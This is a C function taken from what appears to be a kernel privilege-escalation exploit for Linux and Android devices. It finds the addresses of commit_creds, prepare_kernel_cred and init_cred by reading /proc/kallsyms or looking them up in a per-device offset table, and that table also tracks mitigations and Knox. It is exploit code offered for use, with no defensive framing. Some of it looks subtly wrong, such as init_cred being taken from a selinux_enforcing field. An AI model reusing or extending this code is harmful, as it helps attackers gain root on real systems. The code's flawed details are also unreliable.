// ========== KERNEL OFFSET RESOLUTION ==========
int resolve_kernel_offsets() {
    printf("[*] Resolving kernel offsets...\n");
    
    // Try kallsyms first
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (fp) {
        char line[512];
        while (fgets(line, sizeof(line), fp)) {
            char *addr_str = strtok(line, " ");
            char *name = strtok(NULL, " \t\n");
            if (!name || !addr_str) continue;
            
            uint64_t addr = strtoull(addr_str, NULL, 16);
            
            if (is_x86_64) {
                if (strcmp(name, "commit_creds") == 0) commit_creds = addr;
                else if (strcmp(name, "prepare_kernel_cred") == 0) prepare_kernel_cred = addr;
                else if (strcmp(name, "init_cred") == 0) init_cred = addr;
            } else {
                if (strcmp(name, "commit_creds") == 0) commit_creds_arm = addr;
                else if (strcmp(name, "prepare_kernel_cred") == 0) prepare_kernel_cred_arm = addr;
                else if (strcmp(name, "init_cred") == 0) init_cred = addr;
            }
        }
        fclose(fp);
        
        if (commit_creds || commit_creds_arm) {
            printf("[+] Kallsyms resolved: commit_creds=0x%llx\n", 
                   is_x86_64 ? commit_creds : commit_creds_arm);
            kernel_base = (is_x86_64 ? commit_creds : commit_creds_arm) & ~0xfff000ULL;
            return 1;
        }
    }
    
    // Fall back to database
    printf("[*] Using offset database...\n");
    char version[512] = {0};
    FILE *f = fopen("/proc/version", "r");
    if (f) {
        fgets(version, sizeof(version), f);
        fclose(f);
    }
    
    for (int i = 0; offset_database[i].version_pattern != NULL; i++) {
        if (strstr(version, offset_database[i].version_pattern) ||
            strstr(detected_device, offset_database[i].device_model)) {
            
            if (is_x86_64) {
                commit_creds = offset_database[i].commit_creds;
                prepare_kernel_cred = offset_database[i].prepare_kernel_cread;
                init_cred = offset_database[i].selinux_enforcing;
            } else {
                commit_creds_arm = offset_database[i].commit_creds;
                prepare_kernel_cred_arm = offset_database[i].prepare_kernel_cread;
                init_cred = offset_database[i].selinux_enforcing;
            }
            
            mitigations_active = offset_database[i].mitigations;
            has_knox = offset_database[i].has_knox;
            kernel_base = (is_x86_64 ? commit_creds : commit_creds_arm) & ~0xfff000ULL;
            
            printf("[+] Database match: %s\n", offset_database[i].device_model);
            printf("[+] commit_creds: 0x%llx\n", is_x86_64 ? commit_creds : commit_creds_arm);
            printf("[+] mitigations: 0x%x\n", mitigations_active);
            
            return 1;
        }
    }
    
    log_error("Cannot resolve kernel offsets");
    return 0;
}

